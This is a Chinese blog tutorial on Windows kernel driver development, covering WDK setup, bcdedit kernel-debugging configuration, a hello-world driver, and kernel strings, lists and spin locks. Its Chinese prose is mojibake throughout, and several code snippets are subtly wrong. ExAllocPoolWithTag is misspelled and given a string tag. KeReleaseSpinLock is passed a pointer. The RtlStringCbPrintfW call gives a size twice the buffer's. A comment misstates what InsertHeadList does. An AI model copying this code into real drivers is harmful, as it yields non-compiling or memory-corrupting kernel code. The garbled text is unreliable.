        <h2 id="1-ç¯å¢ƒå‡†å¤‡"><a href="#1-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="1. ç¯å¢ƒå‡†å¤‡"></a>1. ç¯å¢ƒå‡†å¤‡</h2><h3 id="å¼€å‘ç¯å¢ƒ"><a href="#å¼€å‘ç¯å¢ƒ" class="headerlink" title="å¼€å‘ç¯å¢ƒ"></a>å¼€å‘ç¯å¢ƒ</h3><p>ä½¿ç”¨Win10ç³»ç»Ÿä¸ºä¾‹</p>
<ol>
<li>Visiual Studio 2019</li>
<li>Windows SDK 10</li>
<li>Windows Driver Kit (WDK)</li>
</ol>
<p>éƒ½æ˜¯é‚£ç§ç›´æ¥å®‰è£…çš„</p>
<h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><p>é©±åŠ¨æ˜¯å†…æ ¸æ¨¡å—ï¼Œæ‰€ä»¥éœ€è¦æ•´ä¸ªWindowsç³»ç»Ÿä½œä¸ºè°ƒè¯•ç¯å¢ƒã€‚ç”±äºæ²¡æœ‰åŒæœºè°ƒè¯•ï¼Œåªèƒ½ä½¿ç”¨è™šæ‹Ÿæœºç½‘ç»œè°ƒè¯•æˆ–ç®¡é“è°ƒè¯•ã€‚</p>
<p>è°ƒè¯•ç¯å¢ƒæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç«  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40277608/article/details/109765965">https://blog.csdn.net/qq_40277608/article/details/109765965</a></p>
<ol>
<li>åŸºäºç½‘ç»œçš„è°ƒè¯•</li>
</ol>
<p>è¢«è°ƒè¯•æœºå™¨ï¼š</p>
<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on <span class="comment"># è®¾ç½®ä¸ºè°ƒè¯•æ¨¡å¼</span></span><br><span class="line">bcdedit /dbgsettings net hostip:<span class="number">192.168</span>.<span class="number">0.110</span> port:<span class="number">50010</span> <span class="comment"># ç½‘ç»œè°ƒè¯•æ–¹å¼ï¼ŒæŒ‡å®šè°ƒè¯•æœºå™¨ipå’Œæœ¬æœºç«¯å£ï¼Œå»ºè®®49152~65535</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤æ¡æŒ‡ä»¤æ‰§è¡Œåä¼šæ˜¾ç¤ºä¸€ä¸ªkeyï¼Œä¿æŒè¿™ä¸ªkeyï¼Œä¸‹é¢ç”¨åˆ°</p>
<p>è°ƒè¯•æœºå™¨ï¼š</p>
<p>VS-&gt;æ‰©å±•-&gt;Driver-&gt;Test-&gt;Configure Drivers-&gt;Add New Driver</p>
<p>Display Nameä¸ºè®¾å¤‡åå­—ï¼ŒNetwork host nameä¸ºè¢«è°ƒè¯•æœºå™¨IPï¼Œä¸‹é¢é€‰æ‹©æ‰‹åŠ¨é…ç½®è°ƒè¯•é€‰é¡¹ä»¥åŠæ‰‹åŠ¨åˆ†å‘é©±åŠ¨æ–‡ä»¶</p>
<p>ä¸‹ä¸€æ­¥ï¼Œåœ¨Kernel Modeä¸‹è®¾ç½®keyä»¥åŠipï¼ŒBus Parametersæ˜¯å¤šå—ç½‘å¡æ—¶æ‰ä¼šä½¿ç”¨ï¼Œè¦æ ¹æ®PCIè§„èŒƒå¡«å…¥æ€»çº¿å·ã€è®¾å¤‡å·ã€åŠŸèƒ½å·</p>
<p>åœ¨é©±åŠ¨å…¥å£å‡½æ•°æ·»åŠ ä¸€ä¸ªKdBreakPoint()ï¼Œè¿™ä¸ªæ–­ç‚¹åªæœ‰åœ¨Debugç‰ˆæœ¬æœ‰ç”¨ï¼ŒDbgBreakPoint()åŒæ—¶åœ¨Releaseç‰ˆæœ¬ä¹Ÿæœ‰ç”¨</p>
<p>ç”Ÿæˆsysæ–‡ä»¶ï¼Œè°ƒè¯•-&gt;é™„åŠ è¿›ç¨‹-&gt;é“¾æ¥ç±»å‹=Windows Kernel Mode Debuggerï¼Œç›®æ ‡é€‰æ‹©é…ç½®å¥½çš„ï¼Œå¯ç”¨è¿›ç¨‹=kernel</p>
<p>æ¥ä¸‹æ¥å°±ä¼šå‡ºç°è°ƒè¯•è¾“å‡ºç•Œé¢(å®é™…ä¸Šå°±æ˜¯gdbçš„è°ƒè¯•ç•Œé¢)</p>
<p>é‡å¯è¢«è°ƒè¯•æœºå™¨ï¼Œå°±å¯ä»¥çœ‹åˆ°è°ƒè¯•ä¿¡æ¯äº†</p>
<p>æœ€åæŠŠsysæ–‡ä»¶æ”¾åœ¨è¢«è°ƒè¯•æœºå™¨ä¸­ï¼Œä½¿ç”¨sc start/sc createè¿è¡Œ</p>
<p>scå‘½ä»¤æ–‡æ¡£ <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/sc-create">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/sc-create</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc742126(v=ws.11)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc742126(v=ws.11)</a></p>
<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> create HelloDriver binpath=<span class="string">&quot;C:\Users\kali\Desktop\HelloDriver.sys&quot;</span> <span class="built_in">type</span>=kernel <span class="built_in">start</span>=demand</span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> HelloDriver</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>åŸºäºç®¡é“çš„è°ƒè¯•</li>
</ol>
<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings serial baudrate:<span class="number">115200</span> debugport:<span class="number">2</span> <span class="comment"># ä¸²å£2ä¸ºè°ƒè¯•ä»‹è´¨ï¼Œæ³¢ç‰¹ç‡ä¸º115200</span></span><br></pre></td></tr></table></figure>
<p>XPåŠæ›´ä½ç‰ˆæœ¬éœ€è¦æ›´æ”¹C:\boot.ini</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[boot loader]</span></span><br><span class="line"><span class="attr">timeout</span>=<span class="number">30</span></span><br><span class="line"><span class="attr">default</span>=multi(<span class="number">0</span>)disk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS</span><br><span class="line"><span class="section">[operating systems]</span></span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDWOS=&quot;WINDWOS XP Debug&quot; /fastdetect /debug /debugport=com2 /baudrate=11520</span><br></pre></td></tr></table></figure>
<p>å…³é—­è™šæ‹Ÿæœºï¼Œåœ¨Vmwareä¸­æ–°å¢ä¸²å£è®¾å¤‡ï¼Œè®¾ç½®å‘½åç®¡é“ï¼Œåå­—ä¸º <code>\.\pipe\com_2</code></p>
<p>ä¿®æ”¹windbgçš„å¿«æ·æ–¹å¼ï¼Œæ”¹ä¸º</p>
<figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;PATH_TO_WINDBG&quot;</span> <span class="literal">-b</span> <span class="literal">-k</span> com:pipe,port=\.\pipe\com_2,resets=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>windbgä¼šè¿æ¥è¢«è°ƒè¯•æœºå™¨</p>
<p>ç”Ÿæˆé©±åŠ¨ï¼Œsc create/sc start</p>
<ol start="3">
<li>å…¶å®ƒ</li>
</ol>
<p>åœ¨è¢«è°ƒè¯•æœºå™¨ä¸Šé¢å®‰è£…debugviewï¼Œå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼Œå¯ä»¥æŸ¥çœ‹è°ƒè¯•è¾“å‡º</p>
<h3 id="æµ‹è¯•ç¤ºä¾‹"><a href="#æµ‹è¯•ç¤ºä¾‹" class="headerlink" title="æµ‹è¯•ç¤ºä¾‹"></a>æµ‹è¯•ç¤ºä¾‹</h3><p>VS2019 åˆ›å»ºæ–°é¡¹ç›®-&gt; Kernel Mode Driver, Empty(KMDF)</p>
<p>æ–°å»ºhello.cï¼Œå¡«å…¥ä»¥ä¸‹ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span> </span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;hello: driver unloading...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span> </span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;hello: driver loaded!&quot;</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;hello:This is a breakpoint&quot;</span>);</span><br><span class="line">	KdBreakPoint();</span><br><span class="line">	DbgPrint(<span class="string">&quot;hello:You step over breakpoint&quot;</span>);</span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç”Ÿæˆæ—¶ä¼šæœ‰ä¸€ä¸ªæ¼æ´ç¼“è§£æªæ–½ï¼Œåœ¨å•ä¸ªç»„ä»¶ä¸­å®‰è£…å°±è¡Œ</li>
<li>ä»¥ä¸‹è­¦å‘Šè§†ä¸ºé”™è¯¯ é¡¹ç›®-&gt;è‡ªå·±çš„é¡¹ç›®-&gt;é…ç½®å±æ€§-&gt;c/c++-&gt;å¸¸è§„-&gt;å°†è­¦å‘Šè§†ä¸ºé”™è¯¯=å¦</li>
<li>SignTaskä»»åŠ¡å¤±è´¥ å±æ€§-&gt;é…ç½®å±æ€§-&gt;Driver Signing-&gt; Sign mode=off</li>
<li>è¿è¡Œæ—¶é€‰æ‹©è°ƒè¯•-&gt;é™„åŠ åˆ°è¿›ç¨‹-&gt;ç±»å‹=Windows kernel mode debugger,ç›®æ ‡=scåˆ›å»ºçš„é©±åŠ¨å,è¿›ç¨‹=kernelï¼Œå¦‚æœæ²¡æœ‰kernelå°±å‹¾é€‰æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·è¿›ç¨‹</li>
</ul>
<p>æ³¨æ„ï¼šç¼–è¯‘ä½æ•°è¦å’Œç³»ç»Ÿä½æ•°ç›¸åŒ</p>
<h2 id="2-é©±åŠ¨å¼€å‘å’Œåº”ç”¨å±‚åº”ç”¨å¼€å‘çš„ä¸åŒ"><a href="#2-é©±åŠ¨å¼€å‘å’Œåº”ç”¨å±‚åº”ç”¨å¼€å‘çš„ä¸åŒ" class="headerlink" title="2. é©±åŠ¨å¼€å‘å’Œåº”ç”¨å±‚åº”ç”¨å¼€å‘çš„ä¸åŒ"></a>2. é©±åŠ¨å¼€å‘å’Œåº”ç”¨å±‚åº”ç”¨å¼€å‘çš„ä¸åŒ</h2><ul>
<li>å…±äº«çš„å†…æ ¸ç©ºé—´vséš”ç¦»çš„åº”ç”¨ç¨‹åº</li>
<li>æ“ä½œç³»ç»Ÿå†…æ ¸ä½äºé«˜2GBï¼Œæœ‰æ¥å£å¯ä»¥ä¾›ç¡¬ä»¶é©±åŠ¨ç¼–ç¨‹äººå‘˜è°ƒç”¨</li>
<li>Windowsä¸€èˆ¬ä½¿ç”¨ç³»ç»Ÿè¿›ç¨‹åŠ è½½å†…æ ¸æ¨¡å—ï¼Œä½†æ˜¯å†…æ ¸ä»£ç ä¸ä¸€å®šå§‹ç»ˆè¿è¡Œåœ¨systemè¿›ç¨‹é‡Œ</li>
</ul>
<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>ä½¿ç”¨é‡æ–°å®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œä¸‡ä¸€å‡ºç°é—®é¢˜ï¼Œé‡æ–°å®šä¹‰ä¸€ä¸‹å°±è¡Œ</p>
<ul>
<li>unsigned long-&gt; ULONG</li>
<li>unsigned char-&gt; UCHAR</li>
<li>unsigned int-&gt; UINT</li>
<li>void-&gt;VOID</li>
<li>unsigned long*-&gt;PULONG</li>
<li>unsigned char*-&gt;PUCHAR</li>
<li>unsigned int*-&gt;PUINT</li>
<li>void*-&gt;PVOID</li>
</ul>
<h3 id="è¿”å›çŠ¶æ€"><a href="#è¿”å›çŠ¶æ€" class="headerlink" title="è¿”å›çŠ¶æ€"></a>è¿”å›çŠ¶æ€</h3><p>ç»å¤§å¤šæ•°å†…æ ¸APIéƒ½æ˜¯è¿”å›ä¸€ä¸ªçŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªé”™è¯¯ç NTSTATUSï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç åˆ¤æ–­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!NT_SUCCESS(status))&#123; <span class="comment">// å¤„ç†å¤±è´¥çš„æƒ…å†µ</span></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é”™è¯¯å€¼çš„æ„æ€ä¸æ€»æ˜¯å¾ˆæ˜ç¡®ï¼Œå¯ä»¥é€šè¿‡WDKå¤´æ–‡ä»¶å¯»æ‰¾</p>
<h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><p>ç”±äºå…±äº«çš„å†…æ ¸ç©ºé—´ï¼Œä½¿å¾—å¾ˆå¤šåº”ç”¨å±‚å¯ä»¥ç”¨çš„APIéƒ½æ— æ³•ä½¿ç”¨</p>
<p>é©±åŠ¨ä¸­çš„å­—ç¬¦ä¸²ç”¨ä¸€ä¸ªç»“æ„æ¥å®¹çº³</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>&#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MAximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING,*PUNICODE_STRING;</span><br></pre></td></tr></table></figure>
<p>å®½å­—ç¬¦åŒå­—èŠ‚</p>
<p>æ‰“å°è¯­å¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING str=RTL_CONSTANT_STRING(<span class="string">L&quot;hello driver!&quot;</span>);</span><br><span class="line">DbgPrint(<span class="string">&quot;%wZ&quot;</span>,&amp;str);</span><br></pre></td></tr></table></figure>
<h3 id="é‡è¦çš„æ•°æ®ç»“æ„"><a href="#é‡è¦çš„æ•°æ®ç»“æ„" class="headerlink" title="é‡è¦çš„æ•°æ®ç»“æ„"></a>é‡è¦çš„æ•°æ®ç»“æ„</h3><ol>
<li><p>é©±åŠ¨å¯¹è±¡ï¼šCè¯­è¨€å¯¹é¢å‘å¯¹è±¡çš„æ¨¡æ‹Ÿï¼ŒæŠŠè®¾å¤‡ã€é©±åŠ¨ã€æ–‡ä»¶çœ‹æˆä¸€ä¸ªå¯¹è±¡<br><code>DRIVER_OBJECT</code></p>
<p>ç”¨äºæè¿°ç¨‹åºæä¾›çš„åŠŸèƒ½ï¼Œå¡«å†™ä¸€ç»„å›è°ƒå‡½æ•°è®©Windowså‡½æ•°</p>
</li>
<li><p>è®¾å¤‡å¯¹è±¡ï¼šå¯èƒ½ä»£è¡¨ç¡¬ç›˜ã€ç®¡é“ç­‰ï¼Œå¯ä»¥æ¥å—è¯·æ±‚ç»™å‡ºå“åº”<br><code>DEVICE_OBJECT</code></p>
</li>
</ol>
<p>é©±åŠ¨å¯¹è±¡ç”Ÿæˆå¤šä¸ªè®¾å¤‡å¯¹è±¡ï¼Œè€ŒWindowså‘è®¾å¤‡å¯¹è±¡å‘å‡ºè¯·æ±‚ï¼Œè¢«é©±åŠ¨å¯¹è±¡çš„åˆ†å‘å‡½æ•°æ•è·ã€‚</p>
<ol start="3">
<li><p>è¯·æ±‚ï¼šç»™è®¾å¤‡å¯¹è±¡å‘çš„æ•°æ®ã€æŒ‡ä»¤ç­‰<code>IRP</code></p>
<p>IRPè¿˜æœ‰å‡ ç§è¡ç”Ÿè¯´æ³•</p>
</li>
</ol>
<h3 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h3><p>æ³¨æ„ç¼–ç¨‹æ—¶æŸ¥çœ‹WDK APIï¼ŒWDKè‡ªå¸¦çš„helpä¹Ÿå¯ä»¥</p>
<p>åç»­å°†ä¼šé™†ç»­ç”¨åˆ°å¸¸ç”¨çš„å‡½æ•°</p>
<h3 id="é©±åŠ¨å¼€å‘æ¨¡å‹"><a href="#é©±åŠ¨å¼€å‘æ¨¡å‹" class="headerlink" title="é©±åŠ¨å¼€å‘æ¨¡å‹"></a>é©±åŠ¨å¼€å‘æ¨¡å‹</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/choosing-a-driver-model">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/choosing-a-driver-model</a></p>
<p>Windowsæœ‰å®˜æ–¹æ–‡æ¡£ï¼ŒåŸºæœ¬ä¸Šå›Šæ‹¬äº†æ‰€æœ‰ç±»å‹çš„é©±åŠ¨ç¨‹åº</p>
<h3 id="WDKç¼–ç¨‹ç‰¹ç‚¹"><a href="#WDKç¼–ç¨‹ç‰¹ç‚¹" class="headerlink" title="WDKç¼–ç¨‹ç‰¹ç‚¹"></a>WDKç¼–ç¨‹ç‰¹ç‚¹</h3><ol>
<li><p>è°ƒç”¨æº</p>
<ul>
<li>å…¥å£å‡½æ•°</li>
<li>å„ç§åˆ†å‘å‡½æ•°</li>
<li>å¤„ç†è¯·æ±‚å®Œæˆæ—¶çš„å›è°ƒå‡½æ•°</li>
<li>å…¶å®ƒå›è°ƒå‡½æ•°</li>
</ul>
</li>
<li><p>å¤šçº¿ç¨‹å®‰å…¨æ€§</p>
<p>å¦‚æœæ€»æ˜¯è€ƒè™‘å¤šçº¿ç¨‹å®‰å…¨ï¼Œåˆ™ä¼šé™ä½æ•ˆç‡ï¼Œæ‰€ä»¥æœ‰ä»¥ä¸‹åŸåˆ™</p>
<ul>
<li>å¯èƒ½è¿è¡Œäºå¤šçº¿ç¨‹ç¯å¢ƒçš„å‡½æ•°å¿…é¡»å¤šçº¿ç¨‹å®‰å…¨</li>
<li>å‡½æ•°Açš„æ‰€æœ‰è°ƒç”¨æºéƒ½æ˜¯å•çº¿ç¨‹ç¯å¢ƒï¼Œåˆ™Aä¹Ÿæ˜¯å•çº¿ç¨‹ç¯å¢ƒ</li>
<li>å‡½æ•°Açš„å…¶ä¸­ä¸€ä¸ªè°ƒç”¨æºä½äºå¤šçº¿ç¨‹ç¯å¢ƒæˆ–å¤šä¸ªè°ƒç”¨æºå¯å¹¶å‘ï¼Œåˆ™Aæ—¶å¤šçº¿ç¨‹</li>
<li>å‡½æ•°Açš„æ‰€æœ‰å¯èƒ½è¿è¡Œäºå¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„è°ƒç”¨è·¯å¾„ä¸Šï¼Œéƒ½æœ‰åºåˆ—åŒ–çš„å¼ºåˆ¶æªæ–½ï¼Œåˆ™Aè¿è¡Œåœ¨å•çº¿ç¨‹ä¸‹</li>
<li>åªä½¿ç”¨å‡½æ•°å†…éƒ¨èµ„æºï¼Œåˆ™æ˜¯å¤šçº¿ç¨‹å®‰å…¨</li>
<li>å¦‚æœå¯¹äºå…¨å±€å˜é‡çš„è®¿é—®å¼ºåˆ¶åºåˆ—åŒ–ï¼Œåˆ™ä¹Ÿæ˜¯å¤šçº¿ç¨‹å®‰å…¨</li>
</ul>
</li>
<li><p>ä»£ç ä¸­æ–­çº§</p>
<p>ä¸­æ–­çº§æœ‰ä¸¤ç§ï¼ŒDispatchå’ŒPassiveï¼ŒDispatchçº§åˆ«é«˜ï¼Œå¤æ‚åŠŸèƒ½è¦æ±‚åœ¨Passiveçº§è¿è¡Œ</p>
<ul>
<li>è°ƒç”¨è·¯å¾„ä¸Šæ— ä¸­æ–­çº§å˜åŒ–ï¼Œåˆ™å‡½æ•°å’Œå®ƒçš„è°ƒç”¨æºä¸­æ–­çº§ç›¸åŒ</li>
<li>è·å–è‡ªæ—‹é”ä¸­æ–­çº§å‡é«˜ï¼Œé‡Šæ”¾è‡ªæ—‹é”ä¸­æ–­çº§ä¸‹é™</li>
</ul>
</li>
<li><p>PAGEèŠ‚ä¸­çš„å‡½æ•°ä¸èƒ½æ—¶Dispatchçº§ï¼Œå› ä¸ºå¯èƒ½å¼•å‘ç¼ºé¡µä¸­æ–­ï¼Œå¯ä»¥ä½¿ç”¨PAGED_CODE()æµ‹è¯•</p>
</li>
</ol>
<h2 id="3-é©±åŠ¨å¼€å‘ä¸­çš„å­—ç¬¦ä¸²å’Œé“¾è¡¨"><a href="#3-é©±åŠ¨å¼€å‘ä¸­çš„å­—ç¬¦ä¸²å’Œé“¾è¡¨" class="headerlink" title="3. é©±åŠ¨å¼€å‘ä¸­çš„å­—ç¬¦ä¸²å’Œé“¾è¡¨"></a>3. é©±åŠ¨å¼€å‘ä¸­çš„å­—ç¬¦ä¸²å’Œé“¾è¡¨</h2><h3 id="å­—ç¬¦ä¸²-1"><a href="#å­—ç¬¦ä¸²-1" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>&#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MAximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING,*PUNICODE_STRING;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line">NTSTATUS status;</span><br><span class="line">UNICODE_STRING str;</span><br><span class="line">RtlInitUnicodeString(&amp;str,<span class="string">L&quot;My first String&quot;</span>); <span class="comment">// åˆå§‹åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line">UNICODE_STRING src=RTL_CONSTANT_STRING(<span class="string">L&quot;My source String&quot;</span>),dst;</span><br><span class="line">WCHAR dst_buf[<span class="number">256</span>]; <span class="comment">// å®šä¹‰ç¼“å†²åŒº</span></span><br><span class="line">RtlInitEmptyUnicodeString(&amp;dst,dst_buf,<span class="number">256</span>*<span class="keyword">sizeof</span>(WCHAR));<span class="comment">// è®©dstä½¿ç”¨dst_bufä½œä¸ºç¼“å†²åŒº</span></span><br><span class="line">RtlCopyUnicodeString(&amp;dst,&amp;src); <span class="comment">// å­—ç¬¦ä¸²æ‹·è´</span></span><br><span class="line">status=RtlAppendUnicodeString(&amp;dst,<span class="string">L&quot;My second String&quot;</span>);<span class="comment">// å­—ç¬¦ä¸²è¿æ¥</span></span><br><span class="line">status=RtlStringCbPrintfW(dst.Buffer,<span class="number">512</span>*<span class="keyword">sizeof</span>(WCHAR),<span class="string">L&quot;filepath=%wZ,size=%d\r\n&quot;</span>,&amp;str,<span class="number">1024</span>); <span class="comment">// ç›¸å½“äºswprintf</span></span><br><span class="line">KdPrint((<span class="string">L&quot;filepath=%wZ,size=%d\r\n&quot;</span>,&amp;str,<span class="number">1024</span>));<span class="comment">//ç›´æ¥è¾“å‡ºï¼Œä½¿ç”¨åŒé‡æ‹¬å·</span></span><br></pre></td></tr></table></figure>
<h3 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS status;</span><br><span class="line">UNICODE_STRING dst=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">dst.Buffer=(PWCHAR)ExAllocPoolWithTag(NonPagedPool,<span class="number">1024</span>,<span class="string">&quot;MyTt&quot;</span>);<span class="comment">//åˆ†é…å†…å­˜ç©ºé—´,NonPagedPoolè¡¨ç¤ºä¸ä¼šè¢«äº¤æ¢åˆ°ç¡¬ç›˜ä¸­çš„å†…å­˜</span></span><br><span class="line">dst.Length=<span class="number">0</span>;</span><br><span class="line">dst.MaximumLength=<span class="number">1024</span>;</span><br><span class="line">ExFreePool(dst.Buffer); <span class="comment">// é‡Šæ”¾å†…å­˜</span></span><br></pre></td></tr></table></figure>
<p>ExAllocPoolWithTagå’ŒExFreePoolå¿…é¡»æˆå¯¹å‡ºç°ï¼Œå¦‚æœä¸é‡Šæ”¾ï¼Œåˆ™æ°¸è¿œé€ æˆå†…å­˜æ³„æ¼ï¼Œç›´åˆ°é‡å¯è®¡ç®—æœº</p>
<p>å†…æ ¸å¼€å‘è€…å®šä¹‰çš„æ•°æ®ç»“æ„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY,*PLIST_ENTRY;</span><br><span class="line">InsertHeadList(&amp;list_Head,(PLIST_ENTRY)&amp;my_struct);<span class="comment">//æ’å…¥åˆ°é“¾è¡¨æœ«å°¾ï¼Œéå¤šçº¿ç¨‹å®‰å…¨</span></span><br></pre></td></tr></table></figure>
<p>è‡ªå®šä¹‰çš„é“¾è¡¨å¯ä»¥æŠŠè¿™ä¸ªç»“æ„æ”¾åœ¨å¼€å¤´</p>
<p>é•¿é•¿æ•´å½¢ <code>LARGE_INTEGER</code></p>
<h3 id="è‡ªæ—‹é”"><a href="#è‡ªæ—‹é”" class="headerlink" title="è‡ªæ—‹é”"></a>è‡ªæ—‹é”</h3><p>è‡ªæ—‹é”ç”¨äºä¿è¯å¤šçº¿ç¨‹çš„å®‰å…¨æ€§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KSPIN_LOCK my_spin_lock;</span><br><span class="line">KIRQL irql;<span class="comment">//ä¸­æ–­çº§åˆ«</span></span><br><span class="line">KeInitializeSpinLock(&amp;my_spin_lock);<span class="comment">//åˆå§‹åŒ–ä¸€ä¸ªè‡ªæ—‹é”</span></span><br><span class="line">KeAcquireSpinLock(&amp;my_spin_lock,&amp;irql);<span class="comment">//æé«˜äº†ä¸­æ–­çº§åˆ«</span></span><br><span class="line"><span class="comment">// your code, single thread executing</span></span><br><span class="line">KeReleaseSpinLock(&amp;my_spin_lock,&amp;irql);</span><br></pre></td></tr></table></figure>
<p>è‡ªæ—‹é”åº”è¯¥æ˜¯å„ä¸ªçº¿ç¨‹å…±äº«çš„å˜é‡</p>
